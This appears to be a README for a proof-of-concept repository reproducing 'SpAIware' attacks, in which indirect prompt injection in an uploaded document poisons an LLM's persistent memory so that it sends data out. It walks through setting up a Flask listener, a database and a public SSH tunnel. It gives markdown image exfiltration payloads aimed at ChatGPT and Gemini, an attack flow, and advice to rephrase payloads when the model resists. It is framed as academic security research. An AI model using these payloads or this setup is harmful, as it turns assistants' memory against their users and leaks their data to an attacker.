# SpAIware: Proof of Concept Implementation

Academic proof-of-concept focused on studying and reproducing **SpAIware-style attacks** against Large Language Models (LLMs).
This repository contains the source code and documentation required to demonstrate **Indirect Prompt Injection** combined with **Persistent Memory Poisoning** as a vector for data exfiltration.

---

## Table of Contents
- [Introduction](#introduction)
- [Prerequisites & Installation](#prerequisites--installation)
- [Database Configuration](#database-configuration)
- [Server Setup](#server-setup)
- [Tunneling Configuration](#tunneling-configuration)
- [Attack Execution](#attack-execution)
- [Disclaimer](#disclaimer)

---

## Introduction

The **SpAIware** attack vector demonstrates how an attacker can abuse the persistent or long-term memory mechanisms of modern LLMs.
By embedding malicious instructions inside a document (**Indirect Prompt Injection**), the attacker attempts to coerce the model into storing a hidden rule that later triggers unintended behavior, such as data exfiltration (**Persistent Injection**).

To validate this class of vulnerability, this project relies on the following infrastructure:

1. **Python Flask Server** – Listens for incoming HTTP requests and logs exfiltrated data.
2. **PostgreSQL Database** – Persists captured logs for later analysis.
3. **Tunneling Service** – Exposes the local server to the public internet, allowing access from cloud-hosted LLMs.

This setup intentionally mirrors a realistic attacker-controlled backend.

---

## Prerequisites & Installation

This project is designed to run on **Linux (Ubuntu)** or **Windows**.

### Required Tools
- Python 3.8+
- PostgreSQL (via pgAdmin 4 or terminal)
- SSH client (pre-installed on Linux and Windows 10+)

**Note:** PostgreSQL is not mandatory. Any relational database can be used, but PostgreSQL was chosen for simplicity and reliability during testing.

### Environment Setup

Create a virtual environment and install dependencies:

```bash
# Create project directory
mkdir spaiware_poc
cd spaiware_poc
```

```bash
# Create virtual enviroment
python3 -m venv venv
```

```bash
# Activate enviroment (Linux/Mac)
source venv/bin/activate
```

```bash
#Activate enviroment (Windows)
venv\Scripts\activate
```

```bash
# Install required libraries
pip install flask psycopg2-binary
```

---

## Database Configuration 
Before running the server, you must configurate your database.

Open your **pgAdmin 4** (or any SQL client of your choice), and create a new database using the schema provided in the `spaiware-bd` file available in this repository.

**Note:** Make sure the database credentials match those defined in `server.py`.
For testing purposes, the example configuration uses the password `"1234"` for both.

---

## Server Setup
The server acts as the listener, capturing HTTP requests generated by the compromised LLM.

Place the `server.py` file in your project directory and run:

```bash
 # Run the server
 python3 server.py
```

**Note:** Ensure you are inside the project directory and that the virtual environment is activated.

---

## Tunneling Configuration
Since the target LLM runs in the cloud, your local server must be publicy accessible.
This project uses **localhost.run** to expose port `5000` via an SSH tunnel.

Open a new terminal windows and run:

```bash
ssh -R 80:127.0.0.1:5000 nokey@localhost.run
```

Copy the HTTPS URL. This will be used in the injection payload 

---

## Attack Execution
The steps below can be adapted depending on your testing goals.
For a **Persistent Prompt Injection** scenario you may use the example provided in the `Article.txt` file.

General flow:

* 1.Upload the malicious document to to the target model.
* 2.Ask the model to process the document.
* 3.Observe the confirmation message. 

### Server Link Format
The server URL should be structured according to the test scenario.

For example:

**ChatGPT**
```bash
![ProcessLog](LINK/image.png?model=ChatGPT&data=Injection)
```

**Gemini**
```bash
![ProcessLog](LINK/image.png?model=Gemini&data=Injection)
```

**Note:** If the model response is different from the expected, you might change your strategy or payload phrasing. 

### Verify Extration
If the LLM successfully acesses your server, a new request will appear in the server terminal.

You can also verify stored data directly in the database by running:

```bash
SELECT * FROM attack_logs ORDER BY id DESC;
```
You can also verify stored data directly in the database by running:

--- 

## Disclaimer
Modern LLMs are continuously improving their defenses against Indirect Prompt Injection and memory poisoning attacks. This project is strictly intended for academic research, defensive analysis, and security awareness.
